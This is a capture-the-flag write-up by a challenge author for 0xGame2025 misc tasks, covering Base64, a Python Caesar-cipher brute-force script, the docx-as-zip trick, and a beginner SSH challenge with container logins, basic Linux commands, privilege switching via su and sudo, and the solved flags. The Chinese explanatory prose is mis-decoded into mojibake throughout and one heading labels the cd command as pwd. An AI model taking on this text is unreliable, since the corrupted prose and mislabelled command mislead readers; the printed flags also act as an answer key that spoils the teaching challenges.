---
title: 0xgame2025 miscé¢˜è§£-ä¸Š
link: 0xgame2025misc1
date: 2026-01-11 13:45:36
description: 0xgame2025çš„miscå‡ ä¹éƒ½æ˜¯æˆ‘å‡ºçš„ï¼Œè¿™é‡Œè®°å½•ä¸€äº›èµ›é¢˜è¯¦ç»†é¢˜è§£
tags:
  - 0xgame2025
  - misc
categories:
  - CTF
cover: /img/cover/game.png
---

# 0xGame2025 misc èµ›é¢˜è§£æ

> 0xGame2025 CTF Misc èµ›é“å‡ºé¢˜è§£æä¸æ•™å­¦æŒ‡å—\
> ä½œè€…ï¼šYo1o\
> <https://xz.aliyun.com/news/19232>\
> æ–‡ç« è½¬è½½è‡ª å…ˆçŸ¥ç¤¾åŒº

æˆ‘æ˜¯ 0xGame2025 çš„éƒ¨åˆ† Misc çš„å‡ºé¢˜äººï¼Œä¸‹é¢æ˜¯é’ˆå¯¹ misc æ–¹å‘çš„æˆè¯¾æ–‡æ¡ˆï¼Œå¸Œæœ›èƒ½å¸®åŠ©åˆšè¸ä¸Š ctf è·¯ä¸Šçš„å­¦å¼Ÿå­¦å¦¹ä»¬å¿«é€Ÿå…¥é—¨

> 0xgame2025 æ‰€æœ‰é¢˜ç›®å½’æ¡£ä¼ é€é—¨å¦‚ä¸‹

* [0xGame2025Week1](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1975497062459904000)

* [0xGame2025Week2](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1978130369429377024)

* [0xGame2025Week3](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1980644777888059392)

* [0xGame2025Week4](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1983791961533845504)

## Week1

### Sign_in

é¢˜ç›®åªç»™æˆ‘ä»¬ä¸€ä¸²ç¼–ç ï¼Œé‡åˆ°è¿™ç±»é¢˜ï¼Œå°±æŠŠå®ƒå¤åˆ¶åˆ°`cyberchef`è¿™ç±»è‡ªåŠ¨åŒ–è§£å¯†[å·¥å…·](https://cyberchef.org/)ï¼ˆæˆ‘ä»¬ç»å¸¸ç®¡å®ƒå«èµ›åšå¨å­ï¼‰ä¸­ï¼Œå·¥å…·ä¼šå¸®æˆ‘ä»¬æ£€æµ‹å‡ºç¼–ç ç±»å‹

ps:æˆ‘ä»¬åœ¨é£ä¹¦ä¸Šæœ‰å‡†å¤‡`cyberchef`çš„ç¦»çº¿ç‰ˆæœ¬ï¼Œä¸‹è½½è§£å‹åç‚¹å‡»é‚£ä¸ª html æ–‡ä»¶å°±èƒ½ç”¨

> è¿™é‡Œå¸Œæœ›å­¦å¼Ÿå­¦å¦¹ä»¬èƒ½çœ‹åˆ°ä¸€ç§é™Œç”Ÿçš„ç¼–ç å°±è¿›è¡Œç®€å•çš„å­¦ä¹ ï¼Œä¸‡å˜ä¸ç¦»å…¶å®—ï¼Œåªè¦æŒæ¡å…¶ä¸­å‡ ç§ç¼–ç åŸç†ï¼Œå…¶ä»–çš„ç¼–ç æ–¹å¼ä¹Ÿå°±èƒ½å¿«é€Ÿä¸Šæ‰‹äº†

ç®€å•è¯´è¯´å·¥å…·çš„ä½¿ç”¨ï¼Œè¯·æ³¨æ„ï¼Œå¦‚æœè¿™é‡Œ output å³ä¾§å‡ºç°é­”æ³•æ£’ï¼Œå°±è¯´æ˜ï¼Œå·¥å…·å·²ç»æ£€æµ‹å‡ºå­—ç¬¦ä¸²çš„å¯èƒ½ç¼–ç æ–¹å¼ï¼Œç‚¹å‡»å³å¯

{% note color:red éœ€è¦æ³¨æ„ï¼Œè¯¥å·¥å…·ä¹Ÿæœ‰å¯èƒ½è¯¯åˆ¤ï¼Œå¦‚æœè¯´è§£å¯†å‡ºæ¥çš„ä¸œè¥¿ä¸å¯è¯»æˆ–è€…æ˜¯åˆ«çš„é”™è¯¯æƒ…å†µï¼Œè¯·åŠæ—¶çš„é€‰æ‹©å…¶ä»–æ³•å­ %}

Recipe ä¸­å‡ºç° From base64ï¼ŒåŒæ—¶ output ä¹Ÿå¤§å˜æ ·ï¼Œå½¢å¼ä¸Šå¾ˆåƒæˆ‘ä»¬è¦æäº¤çš„ flag

è¿™é‡Œå…ˆè®²è§£æ¸…æ¥š Base64 ç¼–ç åŸç†

#### base64 ç¼–ç åŸç†

Base64 ç¼–ç æ˜¯ä½¿ç”¨èŒƒå›´ç‰¹åˆ«å¹¿çš„ä¸€ç§ç¼–ç æ–¹å¼ï¼Œä¸ç®¡æ˜¯å›¾ç‰‡ï¼Œæ–‡å­—ï¼ŒéŸ³é¢‘ç­‰å„ç±»æ–‡ä»¶ï¼Œéƒ½å¯ä»¥é€šè¿‡ base64 ç¼–ç å¤„ç†ï¼Œä¾¿æºå‘é€åˆ°ç½‘ä¸Šè¿›è¡Œä¼ è¾“

æ­£å¸¸çš„ Base64 ç¼–ç ç”¨åˆ°çš„å­—ç¬¦é›†æ˜¯ï¼ˆA-Z, a-z, 0-9, +, /ï¼‰å…± 64 ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æ³¨æ„ï¼Œ'A'åœ¨å­—ç¬¦é›†çš„ç´¢å¼•å€¼æ˜¯ 0ï¼Œ'/'çš„ç´¢å¼•å€¼æ˜¯ 63ï¼Œä¸­é—´çš„å°±æŒ‰ç…§é¡ºåºè¿›è¡Œé€’å¢

ç¼–ç åŸç†å¦‚ä¸‹ï¼Œå…ˆå°†ä¼ è¾“çš„ä¿¡æ¯è½¬æ¢æˆäºŒè¿›åˆ¶ï¼Œç„¶åè¿™é‡Œçš„äºŒè¿›åˆ¶ä¸²éƒ½æ˜¯ 8 ä½çš„ï¼Œæ¥ä¸‹æ¥ 8 ä½å˜ 6 ä½ï¼Œ3 ä¸ªå­—æ¯æ‹† 4 ç»„ï¼Œæ¥ç€ 6 ä½äºŒè¿›åˆ¶å˜åè¿›åˆ¶ï¼Œç„¶åæŒ‰ç…§åè¿›åˆ¶åœ¨ Base64 å­—ç¬¦é›†ä¸­è¿›è¡Œç´¢å¼•ï¼Œä¸Šé¢è¯´çš„ 3 ä¸ªå­—æ¯æ‹† 4 ç»„ï¼Œå¦‚æœè¯´æ‹†çš„æ—¶å€™ä¸å¤Ÿæ‹†äº†ï¼Œè¦ç”¨ 0 å¡«å……ï¼Œä½†æ˜¯å…¨æ˜¯ 0 çš„é‚£ç»„ä¸‹é¢è½¬æ¢ç´¢å¼•å€¼åï¼Œç”¨=å·å¡«å……

ä¸‹é¢æ˜¯å°†æ˜æ–‡ flag è½¬æ¢æˆ base64 ç¼–ç çš„åŸç†ç¤ºæ„å›¾

{% note color:green è¿™é‡Œæœ‰ä¸ªå°ç»“è®ºï¼Œé‡åˆ°`Zmxh`åˆ«è¿Ÿç–‘ï¼Œè¯´ä¸å®šå°±æ˜¯ flag çš„ base64 ç¼–ç å‘¢ï¼Ÿè¿˜æœ‰æ˜‚ï¼Œè¿™é‡Œæˆ‘ä¸€ç›´è¯´çš„æ˜¯ç¼–ç è€Œä¸æ˜¯åŠ å¯†ï¼Œæ‰€ä»¥æ³¨æ„ä¸€ä¸ªå°ç»†èŠ‚ï¼Œä»¥åä¸è¦è¯´ base64 åŠ å¯† %}

#### å‡¯æ’’å¯†ç åŸç†

æ¥ä¸‹æ¥æ‹¿åˆ°å¾ˆåƒ flag çš„å­—ç¬¦ä¸²

```text
0hQkwo{Govm0wo_d0_0hQ4w3_2y25_@xn_r@mu_Pyb_peX}
0xGame{xxx}   #è¿™ä¸€è¡Œç»™ä½ ä»¬æ¯”å¯¹çš„
```

åˆ·é¢˜æ•°é‡è¶³å¤Ÿå¤šçš„è¯ï¼Œèƒ½å¿«é€Ÿè®¤è¯†åˆ°ï¼Œè¿™ä¸ªæ˜¯å‡¯æ’’å¯†ç è¿™ç±»çš„ç®€å•ç§»ä½æ›¿æ¢å¯†ç (ä»”ç»†è§‚å¯Ÿçš„è¯ï¼Œä¼šå‘ç°é¦–å­—æ¯çš„æ•°å­—æ²¡å˜ï¼Œç¬¦å·æ²¡å˜ï¼ŒåŸºæœ¬ä¸Šå°±èƒ½å¾€è¿™é‡ŒçŒœæµ‹äº†

åŠ å¯†åŸç†å°±æ˜¯å°†æ˜æ–‡ä¸­çš„æ¯ä¸ªå­—æ¯æŒ‰ç…§å­—æ¯è¡¨é¡ºåº**å‘åï¼ˆæˆ–å‘å‰ï¼‰ç§»åŠ¨å›ºå®šçš„ä½ç½®**ï¼Œå¾—åˆ°å¯†æ–‡ã€‚

> åŠ è§£å¯†å…¬å¼

* **åŠ å¯†**ï¼š`å¯†æ–‡å­—æ¯ = (æ˜æ–‡å­—æ¯ä½ç½® + åç§»é‡) mod 26`

* **è§£å¯†**ï¼š`æ˜æ–‡å­—æ¯ = (å¯†æ–‡å­—æ¯ä½ç½® - åç§»é‡ + 26) mod 26`

æ‰€ä»¥è¯´åªè¦çŸ¥é“å¯†æ–‡å­—æ¯è¿˜æœ‰**shift**ï¼ˆåç§»é‡ï¼‰å°±èƒ½å¿«é€Ÿé”å®šæ˜æ–‡å­—æ¯

éœ€è¦æ³¨æ„çš„åœ°æ–¹å¦‚ä¸‹ï¼š

å‡¯æ’’å¯†ç è¿›è¡Œæ›¿æ¢çš„æ—¶å€™ï¼Œåº”è¯¥å…ˆæ£€æµ‹æ˜æ–‡æ˜¯å¤§å†™è¿˜æ˜¯å°å†™

å¤§å†™å­—æ¯èŒƒå›´ï¼š`A(65)åˆ°Z(90)`

å°å†™å­—æ¯èŒƒå›´ï¼š`a(97)åˆ°z(122)`

ç”±äºè¿™é‡Œçš„å‡¯æ’’åç§»æŒ‡å®šåœ¨å¯¹åº”çš„å¤§å°å†™å­—æ¯è¡¨ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„èŒƒå›´åªæœ‰ 0-25 çš„ç´¢å¼•å€¼ï¼Œå°±æ˜¯è¯´ï¼Œå¦‚æœæ˜æ–‡æ˜¯å¤§å†™ï¼Œæˆ‘ä»¬åº”è¯¥å‡å» 65ï¼Œç”¨å¾—åˆ°çš„ç»“æœè¿›è¡Œåç§»ï¼Œç„¶åè¿›è¡Œ 26 å–ä½™ç¡®ä¿ç»“æœä¾ç„¶åœ¨å­—æ¯è¡¨ä¸­ï¼Œç„¶åå†+65 å›åˆ°å¤§å†™å­—æ¯ä¸­ï¼Œå°å†™å­—æ¯çš„è§£å¯†æ“ä½œæ˜¯åŒæ ·çš„åŸç†

ä¸è¿‡é—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬è¿™é‡Œå¹¶ä¸çŸ¥é“ shiftï¼Œå¥½åœ¨ç´¢å¼•å€¼ä¸º 0-25ï¼Œå°± 26 ä¸ªé€‰é¡¹ï¼Œå¯ä»¥é€‰æ‹©çˆ†ç ´ï¼Œæœ€åçš„ç»“æœå°±æ˜¯çˆ†ç ´åˆ°ç¬¬ 26 æ¬¡ï¼Œç†è®ºä¾æ®å°±æ˜¯æˆ‘ä¸Šé¢è¯´çš„ï¼ŒåŠ ä¸Š shift åï¼Œæˆ‘ä»¬ä¼šå¯¹ç»“æœè¿›è¡Œ 26 å–ä½™ï¼Œè®©æœ€ç»ˆå¾—åˆ°çš„åç§»å€¼ä¸ä¼šè¶…è¿‡ 26

è¿™é‡Œè¿˜æ˜¯å»ºè®®è‡ªå·±æ‰‹æ“å‡¯æ’’çˆ†ç ´è§£å¯†è„šæœ¬

> ä»€ä¹ˆï¼Ÿï¼ä½ ä»£ç ä¹Ÿå†™ä¸å¥½ï¼Ÿå¥³å­©å­è¯·æ‰¾æˆ‘ï¼Œæˆ‘æ¥æ•™ä½ å†™ï¼›ç”·å­©å­ä¹Ÿå¯ä»¥æ¥æ‰¾æˆ‘ï¼Œæˆ‘å¯ä»¥è€ƒè™‘ç»™ä½ æ¢†æ¢†ä¸€æ‹³

```python
def exp(str,shift):
    result=""
    for char in str:
        if char.isupper():
            result+=chr((ord(char)-65-shift)%26+65)
        elif char.islower():
            result+=chr((ord(char)-97-shift)%26+97)
        else:
            result+=char

    return result
def solver(str):
    for i in range(26):
        a=exp(str,i)
        if a.startswith("0xGame"):
            print(a)
            break

if __name__=="__main__":
    solver("0hQkwo{Govm0wo_d0_0hQ4w3_2y25_@xn_r@mu_Pyb_peX}")
#0xGame{Welc0me_t0_0xG4m3_2o25_@nd_h@ck_For_fuN}
```

### å…¬ä¼—å·åŸç¨¿

é¦–å…ˆè¦çŸ¥é“ä¸€äº›å‰ç½®çŸ¥è¯†

`.docx`æ–‡ä»¶çš„æœ¬è´¨å°±æ˜¯ zip å‹ç¼©åŒ…ï¼Œä¸æ­¤ç±»ä¼¼çš„å¯è¯»çš„æ–‡æ¡£ï¼ˆå‹ç¼©åŒ…ï¼‰æ ¼å¼æœ‰.xlsx å’Œ.pptx

è¿™æ˜¯å¾®è½¯ä» office 2007 å¼€å§‹å¼•å…¥çš„æ–°çš„é»˜è®¤æ ¼å¼ï¼Œéµå¾ªä¸€ä¸ªåä¸ºâ€œ**å¼€æ”¾æ‰“åŒ…çº¦å®š**â€(Open Packaging Conventions,ç®€ç§° OPC)ã€‚

åœ¨è¿™ä¸ªçº¦å®šä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸€ä¸ª`.docx`æ–‡ä»¶çœ‹æˆâ€œæŠ«ç€ Word å¤–è¡£çš„ ZIP å‹ç¼©åŒ…â€

å…³äºçº¦å®šæ ¼å¼ä¸Šçš„ç»†èŠ‚ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±ç ”ç©¶ä¸‹ï¼Œåªéœ€è¦çŸ¥é“ï¼Œä¸‹æ¬¡é‡åˆ°è¿™ç±»é¢˜åï¼Œå¯ä»¥å°è¯•å°†åç¼€åæ”¹æˆ zipï¼Œè§£å‹çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„æ–‡ä»¶åœ¨é‡Œé¢

```bash
[Content_Types].xml
_rels/
docProps/
    app.xml
    core.xml
word/
    document.xml      <-- è¿™é‡Œå­˜æ”¾æ–‡æ¡£çš„ä¸»è¦æ–‡å­—å†…å®¹
    styles.xml        <-- è¿™é‡Œå­˜æ”¾æ ·å¼ä¿¡æ¯
    media/
        image1.png    <-- ä½ æ’å…¥çš„å›¾ç‰‡å°±åœ¨è¿™é‡Œ
    theme/
    _rels/
    ...
```

ä¸€èˆ¬æ¥è¯´ï¼Œè§£å‹**.docx**æ–‡ä»¶åï¼Œå®ƒçš„æ–‡ä»¶ç›®å½•å¦‚ä¸Š

æœ¬é¢˜ä¸­ï¼Œä½ ä»¬è§£å‹åä¼šåœ¨`docProps/`ç›®å½•ä¸‹çœ‹åˆ° gift.xmlï¼Œè€Œè¿™å°±æ˜¯æˆ‘ä¸ºä½ ä»¬å‡†å¤‡çš„ flag

### ez_shell

> æ³¨æ„ï¼šæœ¬é¢˜æ˜¯ SSH å®¹å™¨è¿æ¥é¢˜ç›®\
> æœ¬é¢˜æ˜¯ä¸€é“å¸®åŠ©æ–°ç”Ÿæ¥è§¦ Linux å‘½ä»¤çš„å¼•å¯¼é¢˜ï¼Œå…¶ä»–ä½¬å¯ä»¥è·³è¿‡ä¸‹é¢çš„å¼•å¯¼éƒ¨åˆ†ï¼Œéœ€è¦æäº¤çš„ flag ç»„æˆå¦‚ä¸‹ï¼š\
> ä¸Šè¿°ç»“æœéœ€è¦ç”¨'_'è¿æ¥ï¼Œç„¶åç”¨ 0xGame{}åŒ…è£¹ï¼Œæœ€ç»ˆ flag æ ·ä¾‹ï¼š`0xGame{who_pwd_xxx_xxx_xxx}`\
> ä¼šç”¨åˆ°çš„ä¿¡æ¯ï¼š\
> \
> \
> `whoami`å‘½ä»¤çš„ç»“æœ\
> `pwd`å‘½ä»¤çš„ç»“æœ\
> å½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶å¤¹åï¼ˆé™¤å»ä¸Šçº§è·¯å¾„å’Œå½“å‰è·¯å¾„ç¬¦å·\
> è¯¥æ–‡ä»¶å¤¹ä¸‹é¢çš„ flag1.txt æ–‡ä»¶å†…å®¹\
> `/root`ä¸‹çš„ flag2.txt æ–‡ä»¶å†…å®¹\
> \
> \
> \
> \
> **ssh**è¿æ¥ï¼š`hacker/h@cker_it`\
> **root**ç”¨æˆ·ï¼š`root/Y0u_@re_root`

***

å¦‚ä½•å¦‚ä½•ğŸ‘€ï¼Ÿ

æ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦ shell å—ï¼Œè§£å†³ä¸äº†çš„è¯ï¼Œæˆ‘æ¥æ•™ä½ ,è¿™é‡Œæœ‰ä¸ª[Linux å‘½ä»¤å¤§å…¨](https://www.linuxcool.com/)ï¼Œå…ˆæ”¾è¿™ï¼ŒçŒœä½ ä¸ä¼šä»”ç»†çœ‹ï¼Œå¥½å¥½çœ‹çœ‹æˆ‘ä¸‹é¢çš„å¼•å¯¼æ­¥éª¤å§ï¼Œæ•²é»‘æ¿æ˜‚ï¼ï¼ï¼

#### å¼•å¯¼

> ä¹Ÿè®¸æˆ‘æœ‰æ²¡è¯´æ˜ç™½çš„ç‚¹ï¼Œå¯ä»¥éšæ—¶æ‰¾æˆ‘ï¼Œæˆ–è€…è‡ªè¡Œç ”ç©¶è§£å†³

é‡åˆ°è¿™æ ·çš„`tcp`å®¹å™¨é¢˜ç›®ï¼Œéœ€å¼€å¯å®¹å™¨ï¼Œä¼šå¾—åˆ°ç±»ä¼¼è¿™æ ·çš„å†…å®¹`nc1.ctfplus.cn 34857`

å‰é¢éƒ¨åˆ†å¯ä»¥æ˜¯ IP åœ°å€ä¹Ÿå¯ä»¥æ˜¯åŸŸåï¼Œåé¢çš„æ•°å­—æ˜¯ç«¯å£å·ï¼Œæ³¨æ„ï¼Œä¸­é—´æ˜¯ç©ºå¼€çš„ï¼Œå’Œ http çš„':'è¿æ¥æœ‰æ‰€å·®å¼‚

å¸¸è§çš„ tcp æœåŠ¡æ˜¯ä½¿ç”¨**netcat**è¿™æ ·çš„å·¥å…·è¿›è¡Œ nc è¿æ¥çš„ï¼Œä½†æ˜¯é¢˜ç›®æè¿°ä¸­ï¼Œè¯´åˆ°äº†ï¼Œè¿™ä¸ªæ˜¯ ssh å®¹å™¨é¢˜ç›®ï¼Œè€Œä¸”ç»™å‡ºäº†è¿æ¥è´¦å¯†ï¼Œéœ€è¦æˆ‘ä»¬é€šè¿‡ ssh è¿›è¡Œè¿œç¨‹è¿æ¥

***

* step1 è¿›å…¥ shell

åœ¨ç»ˆç«¯ä¸­è¾“å…¥:

```bash
ssh hacker@nc1.ctfplus.cn -p 34857
```

`tips:powershell,cmd,linuxç»ˆç«¯ç­‰éƒ½å¯ä»¥æ»´`

ä¸€èˆ¬æ¥è¯´ï¼Œssh æœåŠ¡æ˜¯ç”¨é»˜è®¤ç«¯å£ 22 è¿æ¥çš„ï¼Œå°±æ˜¯è¯´åœ¨å¹³æ—¶è¿æ¥é¶æœºçš„æ—¶å€™å¯ä»¥ä¸ç”¨-p æŒ‡å®šç«¯å£ï¼Œè€Œè¿™é‡Œæ˜¯ç”±äº docker å®¹å™¨è¿›è¡Œäº†ç«¯å£è½¬å‘æ‰éœ€è¦æˆ‘ä»¬æŒ‡å®šå¯¹åº”çš„ç«¯å£å·è¿›è¡Œè¿æ¥

ä¸Šé¢çœ‹ä¸æ‡‚é—®é¢˜ä¸å¤§ï¼Œéœ€è¦æ¸…æ¥šä¸€ç‚¹ï¼Œè¿æ¥ ssh éœ€è¦æŒ‡å®šé¶æœºä¸Šæœ‰è¿œç¨‹è¿æ¥æƒé™çš„ç”¨æˆ·ï¼Œæ¯”æ–¹è¯´æœ¬é¢˜ä¸­ï¼Œåªæœ‰ hacker ç”¨æˆ·èƒ½ ssh è¿æ¥ï¼Œroot ä¸å¯ä»¥

```bash
ssh hacker@nc1.ctfplus.cn -p 34857
The authenticity of host '[nc1.ctfplus.cn]:34857 ([103.85.86.154]:34857)' can't be established.
ED25519 key fingerprint is SHA256:heNboAPQQACbtUAWuJK45JXDMmx2YFFmYkGyVhd17e0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[nc1.ctfplus.cn]:34857' (ED25519) to the list of known hosts.
hacker@nc1.ctfplus.cn's password:
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

dep-428f3ef5-705a-4364-a5ee-e59fc8e1fc00-5d4c55ff4b-gpflw:~$
```

å›è½¦è¿è¡Œå‘½ä»¤åä¼šå‡ºç°ä¸€å¤§æ®µå®‰å…¨éªŒè¯çš„ä¿¡æ¯ï¼Œä¸ç”¨ç®¡ï¼Œå¤§è‡´æ„æ€æ˜¯è¯´æœ¬ç”µè„‘ç¬¬ä¸€æ¬¡è¿æ¥è¯¥æœåŠ¡å™¨ï¼Œä¸»æœºåˆ—è¡¨ä¸­æ‰¾ä¸åˆ°å¯¹åº”çš„èº«ä»½è®°å½•ï¼Œç„¶åè¾“å‡ºäº†æœåŠ¡å™¨çš„å…¬é’¥æŒ‡çº¹ï¼Œç”¨æ¥éªŒè¯æœåŠ¡å™¨èº«ä»½çš„ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦è¾“å…¥`yes`æ¥åŒæ„è¿æ¥ï¼Œç„¶åæœåŠ¡å™¨å…¬é’¥ä¼šä¿å­˜åœ¨æœ¬åœ°~/.ssh/known_hosts æ–‡ä»¶ä¸­ï¼Œä¸‹æ¬¡è¿æ¥çš„æ—¶å€™å°±ä¸ä¼šè§¦å‘è­¦å‘Š

æ¥ä¸‹æ¥æ˜¯è¾“å…¥å¯†ç `h@cker_it`ï¼Œè¿™é‡Œä½ ä»¬ä¼šä¸ä¼šå› ä¸ºçœ‹ä¸åˆ°è¾“å…¥çš„å†…å®¹è¯¯ä»¥ä¸ºæœºå™¨å‡ºé—®é¢˜äº†ï¼ŸO(âˆ©_âˆ©)O

è¿™æ˜¯ Linux ç³»ç»Ÿå‡ºäºå®‰å…¨è€ƒè™‘çš„è®¾è®¡ï¼Œä¸ºäº†é˜²æ­¢æ—è§‚è€…åœ¨æˆ‘ä»¬è¾“å…¥å¯†ç æ—¶çœ‹åˆ°ä»»ä½•è§†è§‰åé¦ˆï¼ˆåŒ…æ‹¬æ˜Ÿå·ã€åœ†ç‚¹ç­‰ï¼‰ä½†æ˜¯æˆ‘ä»¬çš„æ¯ä¸€æ¬¡è¾“å…¥éƒ½æ˜¯è¢«æ­£å¸¸è®°å½•çš„ï¼Œæ‰€ä»¥ä¸€å®šè¦æ³¨æ„ä¸è¦æ‰“é”™å­—å“¦ï¼Œå¤åˆ¶è¿›å»ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ˆè¿™ä¸ªè®¾è®¡ç†Ÿæ‚‰å°±å¥½ï¼Œå‡ ä¹æ‰€æœ‰ Linux ç³»ç»Ÿéƒ½æ˜¯è¿™æ ·çš„ï¼Œå°±å¥½æ¯”æ‰‹æœºæŸç½‘ç«™çš„ç™»å½•é¡µé¢ï¼Œè¾“å…¥å¯†ç å…¨ç”¨"Â·"è¿›è¡Œæ›¿ä»£

ç™»å½•åçœ‹åˆ°ç±»ä¼¼`hostname:~$` çš„å­—æ ·ï¼Œå°±è¡¨ç¤ºæˆ‘ä»¬ç™»å½•æˆåŠŸï¼Œé‚£ä¹ˆæ­å–œä½ ç¬¬ä¸€æ¬¡è¿›å…¥ shell æˆåŠŸäº†ğŸ¥³ğŸ¥³ğŸ¥³

* step2 å¼€å§‹ç­”é¢˜

æ‰€æœ‰ Linux çš„åŸºç¡€å‘½ä»¤éƒ½ä¸€æ ·çš„ï¼Œè¯¦ç»†ä»‹ç»è¿˜æ˜¯è¯·çœ‹æˆ‘ä¸Šé¢æ”¾ç½®çš„ç½‘é¡µé“¾æ¥,ä¸‹é¢ä»…ä»…è®²è¿°é¢˜ç›®ä¸­è¦ç”¨åˆ°çš„å‘½ä»¤ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬ç»å¸¸ç”¨çš„

-- whoami

å¾ˆæ˜¾ç„¶ï¼Œæ˜¯ who am iï¼ˆæˆ‘æ˜¯è°ï¼‰ï¼Œç”¨é€”æ˜¯æ˜¾ç¤ºå½“å‰ç”¨æˆ·å

```bash
yolo@yolo:~$ whoami
yolo
```

-- pwd

print working directoryï¼ŒåŠŸèƒ½æ˜¯æ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½•çš„ç»å¯¹è·¯å¾„

```bash
yolo@yolo:~$ pwd
/home/yolo
```

-- ls

çœŸæ˜¯æœ€æœ€å¸¸ç”¨çš„å‘½ä»¤ï¼Œç”¨é€”æ˜¯åˆ—å‡ºå½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶åŠå…¶å±æ€§ä¿¡æ¯ï¼Œä½†æ˜¯ç»å¸¸è¦ç»“åˆå‚æ•°ä½¿ç”¨

```plain
yolo@yolo:~$ ls
yolo@yolo:~$ ls -la
total 12
drwxr-xr-x  3 yolo yolo 4096 Sep 26 17:58 .
drwxr-xr-x 11 yolo yolo 4096 Sep 26 17:56 ..
drwxr-xr-x  2 yolo yolo 4096 Sep 26 17:58 .secret
```

ç¬¬ä¸€ä¸ª ls ä¼šå•çº¯åˆ—å‡ºæ­£å¸¸æ— éšè—çš„æ–‡ä»¶åæˆ–æ–‡ä»¶å¤¹åï¼Œåœ¨ Linux ä¸­ï¼Œåƒ.xxx è¿™æ ·çš„ï¼Œåå­—å‰é¢æ˜¯'.'çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ä¼šè¢«ç³»ç»Ÿé»˜è®¤éšè—ï¼Œéœ€è¦ä½¿ç”¨-a æ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—çš„ï¼›-l ä¼šåˆ—å‡ºæ–‡ä»¶çš„å±æ€§ï¼ŒåŒ…æ‹¬æ–‡ä»¶ç±»å‹ã€æƒé™ã€ç¼–è¾‘æ—¶é—´ã€æ‰€æœ‰è€…ç­‰ç­‰

> è¿™é‡Œçš„.ä»£è¡¨çš„æ˜¯å½“å‰ç›®å½•ï¼Œæ˜¯ä¸€ç§ç›¸å¯¹è·¯å¾„ï¼Œ..ä»£è¡¨çš„æ˜¯ä¸Šä¸€çº§è·¯å¾„ï¼Œå‰é¢çš„**drwxr-xr-x**äº¤ç»™ä½ ä»¬è‡ªå·±ç ”ç©¶

-- pwd

æœ¬å‘½ä»¤å¯ä»¥æ”¹å˜å½“å‰è·¯å¾„ï¼Œå’Œæˆ‘ä»¬åœ¨ Windows æ¡Œé¢åŒç‚¹æŸæ–‡ä»¶å¤¹è¿›å»çœ‹é‡Œé¢çš„å†…å®¹çš„æ“ä½œç±»ä¼¼

```plain
yolo@yolo:~$ pwd
/home/yolo
yolo@yolo:~$ cd .secret
yolo@yolo:~/.secret$ pwd
/home/yolo/.secret
```

-- cat

æœ¬å‘½ä»¤å¯ä»¥è¯»å–æŒ‡å®šæ–‡ä»¶çš„å†…å®¹ï¼Œæ­£å¸¸æ¥è¯´ï¼Œæ¨èç”¨ cat è¯»å–é‚£äº›å°ç‚¹çš„ï¼Œçº¯æ–‡æœ¬çš„æ–‡ä»¶ï¼Œæ¯”æ–¹è¯´ flag.txt è¿™æ ·çš„ï¼Œå…¶ä»–æƒ…å†µä¸‹ï¼Œæœ‰å…¶ä»–å‘½ä»¤å¯ä»¥ç”¨ï¼Œæ¯”å¦‚ more,less ç­‰ç­‰ï¼Œè‡ªä¸ªç ”ç©¶æ˜‚

```plain
yolo@yolo:~/Desktop/.secret$ ls
flag1.txt
yolo@yolo:~/Desktop/.secret$ cat flag1.txt
congratulation!
```

-- su root

Linux å¯¹äºæƒé™çš„æ¦‚å¿µå¾ˆä¸¥æ ¼ï¼ˆå½“ç„¶ Windows åŒæ ·ï¼Œåªæ˜¯ä¸å¸¸è§

ä¸€äº›æ–‡ä»¶æˆ–è·¯å¾„ï¼Œéœ€è¦é«˜æƒé™ä¹ƒè‡³ root ç”¨æˆ·æ‰èƒ½è¿›å…¥ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ su xxx æŒ‡å®šåˆ‡æ¢ç”¨æˆ·ï¼ŒåŒæ ·éœ€è¦ä½¿ç”¨ç™»å½•å¯†ç 

```plain
yolo@yolo:~/.secret$ cd /root
-bash: cd: /root: Permission denied
yolo@yolo:~/.secret$ su root
Password:
root@yolo:/.secret# cd /root
root@yolo:~# pwd
/root
```

è¿™é‡Œæˆ‘ç»™ç”¨æˆ·åŒæ ·è®¾ç½®äº†ä¸ç”¨å¯†ç çš„ sudo æƒé™ï¼Œå…è®¸ç”¨æˆ· yolo ä¸è¾“å…¥å¯†ç çš„æƒ…å†µä¸‹ç›´æ¥æ‰§è¡Œ root æƒé™å‘½ä»¤

```plain
yolo@yolo:~/.secret$ id
uid=1000(yolo) gid=1000(yolo) groups=1000(yolo)
yolo@yolo:~/.secret$ sudo su
root@yolo:/home/yolo/.secret# id
uid=0(root) gid=0(root) groups=0(root)
root@yolo:/home/yolo/.secret# cd /root
root@yolo:~# cat flag2.txt
hacker!
```

* step3 åˆæˆ flag

```plain
0xGame{yolo_/home/yolo_.secret_congratulation!_hacker!}
```

